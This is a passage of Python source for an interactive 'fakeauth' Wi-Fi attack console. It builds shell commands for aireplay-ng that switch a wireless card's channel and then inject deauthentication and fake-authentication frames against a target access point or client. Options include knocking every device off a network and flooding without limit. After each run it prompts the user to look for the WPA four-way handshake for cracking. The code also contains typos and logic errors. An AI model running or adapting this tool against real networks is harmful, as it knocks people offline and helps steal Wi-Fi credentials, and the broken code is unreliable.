						self.bssid_deauth_auth = str(deauth_index[2])
						if len(self.bssid_deauth_auth) != 17:
							print("ERROR: Target bssid must have a character length of 17")
							self.bssid_deauth_auth = None
							FakeAccessPointAuthentication.fakeauth_deauth_attack()
						else:
							print(deauth_index[1]+" => "+deauth_index[2])
							del deauth_index
							FakeAccessPointAuthentication.fakeauth_deauth_attack()
							
					elif deauth_index[1] == "CHANNEL" or deauth_index[1] == "channel":
						self.channel_deauth_auth = int(deauth_index[2])
						if self.channel_deauth_auth > 13:
							print("ERROR: Cannot set wireless channel greater than 13")
							self.channel_deauth_auth = 0
							FakeAccessPointAuthentication.fakeauth_deauth_attack()
							
						elif self.channel_deauth_auth == 0:
							print("ERROR: Cannot set wireless channel to 0")
							self.channel_deauth_auth = None
							FakeAccessPointAuthentication.fakeauth_deauth_attack()
							
						else:
							print(deauth_index[1]+" => "+deauth_index[2])
							del deauth_index
							FakeAccessPointAuthentication.fakeauth_deauth_attack()
							
					elif deauth_index[1] == "INTERFACE" or deauth_index[1] == "interface":
						self.interface_deauth_auth = str(deauth_index[2])
						print(deauth_index[1]+" => "+deauth_index[2])
						del deauth_index
						FakeAccessPointAuthentication.fakeauth_deauth_attack()
						
					elif deauth_index[1] != "CLIENT_MAC" or deauth_index[1] != "client_mac" or deauth_index[1] != "PACKET_COUNT" or deauth_index[1] != "packet_count" or deauth_index[1] != "BSSID" or deauth_index[1] != "bssid" or deauth_inedex[1] != "CHANNEL" or deauth_index[1] != "channel" or deauth_index[1] != "INTERFACE" or deauth_index[1] != "interface":
						print('['+Fore.RED+'*\033[0;m'+'] '+Fore.RED+'Error\033[0;m'+': Unknown parameter \"%s\"...' % deauth_index[1])
			elif fakeauth_input == "run" and self.packet_count_deauth_auth != None and len(self.bssid_deauth_auth) == 17 and self.channel_deauth_auth <= 13 and self.interface_deauth_auth != None:
				#if no client is specified then inject deauthentication replay frames accross the network
				if self.client_mac_deauth_auth == None:
					print("Switching %s to channel %s..." % (self.interface_deauth_auth, self.channel_deauth_auth))
					subprocess.call(("iwconfig %s channel %s" % (self.interface_deauth_auth, self.channel_deauth_auth)), shell=True, stdout=subprocess.PIPE)
					time.sleep(2)
					print("Network card %s set to channel %s" % (self.interface_deauth_auth, self.channel_deauth_auth))
					time.sleep(2)
					print("Deauthenticating all clients across the network! This will deauthenticate all devices connected to %s" % self.bssid_deauth_auth)
					time.sleep(3)
					try:
						print("Executing fake authentication deauthentication attack! Not suppressing output. Press ctrl+c to stop the attack...")
						x = 0
						while x != 3:
							print("Injecting deauthentication replay frames across the network...")
							time.sleep(3)
							subprocess.call("aireplay-ng -0 %s -a %s %s" % (self.packet_count_deauth_auth, self.bssid_deauth_auth, self.interface_deauth_auth), shell=True)
							time.sleep(2)
							print("Injecting fake authentication frames accross the network...")
							time.sleep(3)
							subprocess.call("aireplay-ng -1 %s -a %s %s" % (self.packet_count_deauth_auth, self.bssid_deauth_auth, self.interface_deauth_auth), shell=True)
							print("In rest mode for 10 seconds...")
							time.sleep(10)
							x+=1
							if x == 3:
								print("Performed 3 rounds successfully. Look for the 4 way handshake")
								time.sleep(3)
								FakeAccessPointAuthentication.fakeauth_deauth_attack()
					except KeyboardInterrupt:
						print("Stoping fake authentication and deauthentication attack...")
						time.sleep(2)
						print("Attack complete but did not finish 100%")
						time.sleep(2)
						FakeAccessPointAuthentication.fakeauth_deauth_attack()
					else:
						FakeAccessPointAuthentication.fakeauth_deauth_attack()
						
				elif self.client_mac_deauth_auth != None:
					try:
						print("Switching %s to channel %s..." % (self.interface_deauth_auth, self.channel_deauth_auth))
						subprocess.call(("iwconfig %s channel %s" % (self.interface_deauth_auth, self.channel_deauth_auth)), shell=True, stdout=subprocess.PIPE)
						time.sleep(2)
						print("Network card %s set to channel %s" % (self.interface_deauth_auth, self.channel_deauth_auth))
						time.sleep(2)
						print("Executing fake authentication deauthentication attack! Not suppressing output. Press ctrl+c to stop the attack...")
						time.sleep(2)
						print("Deauthenticating target client %s connected to access point %s" % (self.client_mac_deauth_auth, self.bssid_deauth_auth))
						time.sleep(3)
						x = 0
						while x != 3:
							print("Injecting deauthentication replay frames across the network...")
							time.sleep(3)
							subprocess.call("aireplay-ng -0 %s -a %s -c %s %s" % (self.packet_count_deauth_auth, self.bssid_deauth_auth, self.client_mac_deauth_auth, self.interface_deauth_auth), shell=True)
							time.sleep(2)
							print("Injecting fake authentication frames across the network...")
							time.sleep(3)
							subprocess.call("aireplay-ng -1 %s -a %s %s" % (self.packet_count_deauth_auth, self.bssid_deauth_auth, self.interface_deauth_auth), shell=True)
							print("In rest mode for 10 seconds...")
							time.sleep(10)
							x+=1
							if x == 3:
								print("Performed 3 rounds successfully. Look for the 4 way handshake")
								time.sleep(3)
								FakeAccessPointAuthentication.fakeauth_deauth_attack()
					
					except KeyboardInterrupt:
						print("Stoping fake authentication and deauthentication attack...")
						time.sleep(2)
						FakeAccessPointAuthentication.fakeauth_deauth_attack()
					else:
						print("Fake authentication and deauthentication attack complete")
						time.sleep(2)
						FakeAccessPointAuthentication.fakeauth_deauth_attack()
			elif fakeauth_input == "run" and self.packet_count_deauth_auth == None and self.bssid_deauth_auth == None and self.interface_deauth_auth == None: 
				print("ERROR: Nothing was set")
									
			else:
				print('['+Fore.RED+'*\033[0;m'+'] '+Fore.RED+'Error\033[0;m'+': Unknown option \"%s\"...' % fakeauth_input)
				time.sleep(.5)
				FakeAccessPointAuthentication.fakeauth_deauth_attack()
		except KeyboardInterrupt:
			print('Interrupt: use the \"exit\" command to quit')
			FakeAccessPointAuthentication.fakeauth_deauth_attack()
		else:
			FakeAccessPointAuthentication.fakeauth_deauth_attack()
#---------------------------------------------------------------------------------------------------------------------------------
	client_mac_dos_deauth = None
	packet_count_dos_deauth = None
	bssid_dos_deauth = None
	channel_dos_deauth = None
	interface_dos_deauth = None
	
	@classmethod
	def fake_auth_dos_deauth_attack(self):
		can_execute = False
		try:
			fakeauth_dos_input = raw_input('faf fakeauth'+"("+Fore.RED+"fake_auth/dos/deauth\033[0;m"+") > ")
			deauth_dos_index = list(fakeauth_dos_input.split(" "))
			if fakeauth_dos_input == "help" or fakeauth_dos_input == "?":
				print("""
Core Commands
=======================

\tCommands                Description
\t-------------------	--------------------
\tshow attacks		Display the current available network attacks
\tshow payloads		Display payloads to carry across a vulnerable network
\tshow plugins		Display plugins to use within the fakeauth framework
\tshow options		Display options for the current network attack vector
\tinfo			Display info on a certain payload, plugin or attack
\texit			Exit the fakeauth network toolkit framework
				""")
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "":
				del deauth_dos_index
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()

			elif fakeauth_dos_input == "show attacks":
				del deauth_dos_index
				print('['+Fore.GREEN+'*\033[0;m'+'] Getting network attacks...')
				time.sleep(3)
				print(""" 
Network Attacks			Module					Description
------------------		---------				-------------
Fake Authentication Attack	fakeauth/network/fake_auth      	Perform a fake authentication attack
Fake Auth Deauth Attack		fakeauth/network/deauth/fake_auth	Fake authenticate and deauthenticate
Deauthentication Attack		fakeauth/network/dos/deauth		Denial of Service Deauth Attack
Deauth Time Attack		fakeauth/network/dos/time/deauth	Denial of Service Time Deauth Attack
				""")
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "clear":
				del deauth_dos_index
				subprocess.call("clear", shell=True)
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "exit" or fakeauth_dos_input == "quit" or fakeauth_dos_input == "leave":
				del deauth_dos_index
				print('['+Fore.RED+'*\033[0;m'+'] Exitting the fakeauth network attack framework...')
				time.sleep(3)
				exit()
			elif fakeauth_dos_input == "exit now":
				exit()
			elif fakeauth_dos_input == "show payloads":
				del deauth_dos_index
				print('['+Fore.GREEN+'*\033[0;m'+'] Getting network attack payloads...')
				time.sleep(3)
				print("""
Network Payloads		Module					Description
----------------		--------				-------------
0::display			0::display				0::display
				""")
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "banner" or fakeauth_dos_input == "get banner" or fakeauth_dos_input == "show banner":
				del deauth_dos_index
				print(Fore.BLUE+'[*]\033[0;m'+' Executing banner...')
				time.sleep(3)
				subprocess.call("clear", shell=True)
				FakeAccessPointAuthentication.fakeauth_banner()
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "show plugins":
				del deauth_dos_index
				print(Fore.GREEN+'[*]\033[0;m'+' Getting network plugins...')
				time.sleep(3)
				print("""
Network Plugins			Module					Description
----------------		-------					------------
System Commands			fakeauth/system/exec/system_commands	Execute system commands from fakeauth
Check MAC Status		fakeauth/system/check/mac_address	Check the current system mac address
Spoof MAC Address		fakeauth/system/spoof/mac_address	Spoof the curent system mac address
Enable Monitor Mode		fakeauth/system/enable/monitor_mode	Enable monitor mode on a system iface
				""")
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "use fakeauth/network/fake_auth":
				del deauth_dos_index
				#create this function after listing of others
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this attack vector" % fakeauth_dos_input)
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "use fakeauth/network/deauth/fake_auth":
				del deauth_dos_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this attack vector" % fakeauth_dos_input)
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "use fakeauth/network/dos/deauth":
				del deauth_dos_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this attack vector" % fakeauth_dos_input)
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "use fakeauth/network/dos/deauth":
				del deauth_dos_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this attack vector" % fakeauth_dos_input)
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			#conditions for network plugins
			elif fakeauth_dos_input == "enable plugin fakeauth/system/exec/system_commands":
				del deauth_dos_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this plugin" % fafakeauth_dos_inputkeauth_deauth)
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "enable plugin fakeauth/system/check/mac_address":
				if self.plugin_check_mac == True:
					print("ERROR: Cannot load fakeauth/system/check/mac_address. Plugin already loaded")
					FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
				else:
					del deauth_dos_index
					self.plugins+=1
					self.plugin_id+=1
					self.plugin_check_mac = True
					loaded_check_mac = ("Plugin: fakeauth/system/check/mac_address Loaded: %s Id: %s" % (self.plugin_check_mac, self.plugins))
					self.plugins_list.append("%s" % loaded_check_mac)
					print(Fore.GREEN+'[+]\033[0;m Loading plugin fakeauth/system/check/mac_address...')
					time.sleep(2)
					print("Loaded plugin => fakeauth/system/check/mac_address with id => %s" % (self.plugins))
					FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "use plugin fakeauth/system/check/mac_address" and self.plugin_check_mac == True:
				del deauth_dos_index
				time.sleep(1)
				subprocess.call("/root/check_spoof.sh", shell=True)
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "use plugin fakeauth/system/check/mac_address" and self.plugin_check_mac != True:
				del deauth_dos_index
				time.sleep(1)
				print("ERROR => You must first enable the plugin fakeauth/system/check/mac_address")
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "disable plugin fakeauth/system/check/mac_address" and self.plugin_check_mac == True:
				del deauth_dos_index
				self.plugins-=1
				self.plugin_id-=1
				plugin_interact = "fakeauth/system/check/mac_address"
				self.plugin_check_mac = False
				self.plugins_list = []
				time.sleep(1)
				print("Disabled plugin => fakeauth/system/check/mac_address")
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "disable plugin fakeauth/system/check/mac_address" and self.plugin_check_mac == False:
				del deauth_dos_index
				time.sleep(1)
				print("ERROR => You cannot disable the plugin fakeauth/system/check/mac_address. It was never loaded")
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "list plugins_loaded":
				del deauth_dos_index
				print(self.plugins)
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "show plugins_loaded":
				print("%s" % (self.plugins_list))
				del deauth_dos_index
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "show plugins_loaded" and self.plugins_list is None:
				print("No plugins loaded none to show")
				del deauth_dos_index
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			#interact with plugins
			elif deauth_dos_index[0] == "interact" and deauth_dos_index[1] == "with_plugin_id":
				if deauth_dos_index[2] != None:
					time.sleep(1)
					print("Interacting with plugin id => %s" % deauth_dos_index[2])
					time.sleep(2)
					del deauth_dos_index
					FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "enable plugin fakeauth/system/spoof/mac_address":
				del deauth_dos_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this plugin" % fakeauth_dos_input)
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "enable plugin fakeauth/system/enable/monitor_mode":
				del deauth_dos_index
				print(Fore.RED+"[-]\033[0;m"+" Cannot execute \"%s\"! Type \"back\" to use this plugin" % fakeauth_dos_input)
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "back":
				del deauth_dos_index
				self.client_mac_dos_deauth = None
				FakeAccessPointAuthentication.fakeauth()
			elif fakeauth_dos_input == "show options":
				del deauth_dos_index
				print("""
Network attack options (fakeauth/network/deauth/fake_auth):\n
\tName	    \tCurrent setting \tRequired \tDescription		
\t-----	    \t--------------- \t-------- \t-----------
\tCLIENT_MAC\t%s              \tno       \tThe client address on the network to deauthenticate
\tPACKET_COUNT\t%s            \tyes    \t\tThe amount of packets to send across the network
\tBSSID     \t%s              \tyes      \tThe wireless mac address of the access point
\tCHANNEL   \t%s              \tyes    \t\tThe channel to listen on
\tINTERFACE \t%s	      \t\tyes	 \tThe wireless interface needed to execute the attack
				""" % (self.client_mac_dos_deauth, self.packet_count_dos_deauth, self.bssid_dos_deauth, self.channel_dos_deauth, self.interface_dos_deauth))
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif deauth_dos_index[0] == "set":
				#net_index = list(net_fakeauth.split(" "))
				if len(deauth_dos_index) == 3:
					if deauth_dos_index[1] == "CLIENT_MAC" or deauth_dos_index[1] == "client_mac":
						self.client_mac_dos_deauth = str(deauth_dos_index[2])
						if len(self.client_mac_dos_deauth) != 17:
							print("ERROR: Client address must have a character length of 17")
							self.client_mac_dos_deauth = None
							FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
						else:
							print(deauth_dos_index[1]+" => "+deauth_dos_index[2])
							del deauth_dos_index
							FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
					
					elif deauth_dos_index[1] == "PACKET_COUNT" or deauth_dos_index[1] == "packet_count":
						self.packet_count_dos_deauth = int(deauth_dos_index[2])
						if self.packet_count_dos_deauth == 0:
							print("Warning injection frames set to unlimited. You will need to press ctrl+c to stop the attack!")
							self.channel_dos_deauth = int(deauth_dos_index[2])
							FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
						else:
							print(deauth_dos_index[1]+" => "+deauth_dos_index[2])
							del deauth_dos_index
							FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
							
					elif deauth_dos_index[1] == "BSSID" or deauth_dos_index[1] == "bssid":
						self.bssid_dos_deauth = str(deauth_dos_index[2])
						if len(self.bssid_dos_deauth) != 17:
							print("ERROR: Target bssid must have a character length of 17")
							self.bssid_dos_deauth = None
							FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
						else:
							print(deauth_dos_index[1]+" => "+deauth_dos_index[2])
							del deauth_dos_index
							FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
							
					elif deauth_dos_index[1] == "CHANNEL" or deauth_dos_index[1] == "channel":
						self.channel_dos_deauth = int(deauth_dos_index[2])
						if self.channel_dos_deauth > 13:
							print("ERROR: Cannot set wireless channel greater than 13")
							self.channel_dos_deauth = None
							FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
							
						elif self.channel_dos_deauth == 0:
							time.sleep(2)
							print("ERROR: Cannot set channel value to 0!")
							FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
							
						else:
							print(deauth_dos_index[1]+" => "+deauth_dos_index[2])
							del deauth_dos_index
							FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
							
					elif deauth_dos_index[1] == "INTERFACE" or deauth_dos_index[1] == "interface":
						self.interface_dos_deauth = str(deauth_dos_index[2])
						print(deauth_dos_index[1]+" => "+deauth_dos_index[2])
						del deauth_dos_index
						FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
						
					elif deauth_dos_index[1] != "CLIENT_MAC" or deauth_dos_index[1] != "client_mac" or deauth_dos_index[1] != "PACKET_COUNT" or deauth_dos_index[1] != "packet_count" or deauth_dos_index[1] != "BSSID" or deauth_dos_index[1] != "bssid" or deauth_dos_index[1] != "CHANNEL" or deauth_dos_index[1] != "channel" or deauth_dos_index[1] != "INTERFACE" or deauth_dos_index[1] != "interface":
						print('['+Fore.RED+'*\033[0;m'+'] '+Fore.RED+'Error\033[0;m'+': Unknown parameter \"%s\"...' % deauth_dos_index[1])
			
			elif fakeauth_dos_input == "run" and self.packet_count_dos_deauth != None and len(self.bssid_dos_deauth) == 17 and self.bssid_dos_deauth != None and self.channel_dos_deauth <= 13 and self.interface_dos_deauth != None:
				#if no client is specified then inject deauthentication replay frames accross the network
				if self.client_mac_dos_deauth == None:
					print("Switching %s to channel %s..." % (self.interface_dos_deauth, self.channel_dos_deauth))
					subprocess.call(("iwconfig %s channel %s" % (self.interface_dos_deauth, self.channel_dos_deauth)), shell=True, stdout=subprocess.PIPE)
					time.sleep(2)
					print("Network card %s set to channel %s" % (self.interface_dos_deauth, self.channel_dos_deauth))
					time.sleep(2)
					print("Deauthenticating all clients across the network! This will deauthenticate all devices connected to %s" % self.bssid_dos_deauth)
					time.sleep(3)
					try:
						print("Executing fake authentication deauthentication attack! Not suppressing output. Press ctrl+c to stop the attack...")
						print("Injecting deauthentication replay frames across the network...")
						time.sleep(3)
						subprocess.call("aireplay-ng -0 %s -a %s %s" % (self.packet_count_dos_deauth, self.bssid_dos_deauth, self.interface_dos_deauth), shell=True)
					except KeyboardInterrupt:
						print("\nStopping deauthentication attack...")
						time.sleep(2)
						print("Attack complete 100%")
						time.sleep(2)
						FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
					else:
						FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
						
				elif self.client_mac_dos_deauth != None:
						print("Switching %s to channel %s..." % (self.interface_dos_deauth, self.channel_dos_deauth))
						subprocess.call(("iwconfig %s channel %s" % (self.interface_dos_deauth, self.channel_dos_deauth)), shell=True, stdout=subprocess.PIPE)
						time.sleep(2)
						print("Network card %s set to channel %s" % (self.interface_dos_deauth, self.channel_dos_deauth))
						time.sleep(2)
						print("Executing fake authentication deauthentication attack! Not suppressing output. Press ctrl+c to stop the attack...")
						time.sleep(2)
						print("Deauthenticating target client %s connected to access point %s" % (self.client_mac_dos_deauth, self.bssid_dos_deauth))
						time.sleep(3)
						try:			
							print("Injecting deauthentication replay frames across the network...")
							time.sleep(3)
							subprocess.call("aireplay-ng -0 %s -a %s -c %s %s" % (self.packet_count_dos_deauth, self.bssid_dos_deauth, self.client_mac_dos_deauth, self.interface_dos_deauth), shell=True)
							time.sleep(2)
							
						except KeyboardInterrupt:
							print("\nStopping deauthentication attack...")
							time.sleep(2)
							print("Deauthentication attack complete! Attack complete 100%")
							time.sleep(2)
							FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
						else:
							print("Deauthentication attack complete")
							time.sleep(2)
							FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "run" and self.packet_count_dos_deauth == None and self.bssid_dos_deauth == None and self.interface_dos_deauth == None and self.channel_dos_deauth == None: 
				print("ERROR: Nothing was set")
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "bool can_execute" and self.packet_count_dos_deauth != None and len(self.bssid_dos_deauth) == 17 and self.bssid_dos_deauth != None and self.channel_dos_deauth <= 13 and self.interface_dos_deauth != None:
				del deauth_dos_index
				can_execute = True
				print("can_execute => %s" % can_execute)
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			elif fakeauth_dos_input == "bool can_execute" and self.packet_count_dos_deauth == None and self.bssid_dos_deauth == None and self.interface_dos_deauth == None and self.channel_dos_deauth == None:
				del deauth_dos_index
				can_execute = False
				print("can_execute => %s" % can_execute)
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
			else:
				print('['+Fore.RED+'*\033[0;m'+'] '+Fore.RED+'Error\033[0;m'+': Unknown option \"%s\"...' % fakeauth_dos_input)
				time.sleep(.5)
				FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
		except KeyboardInterrupt:
			print('Interrupt: use the \"exit\" command to quit')
			FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
		else:
			FakeAccessPointAuthentication.fake_auth_dos_deauth_attack()
				
FakeAccessPointAuthentication.fakeauth_banner()
FakeAccessPointAuthentication.fakeauth()
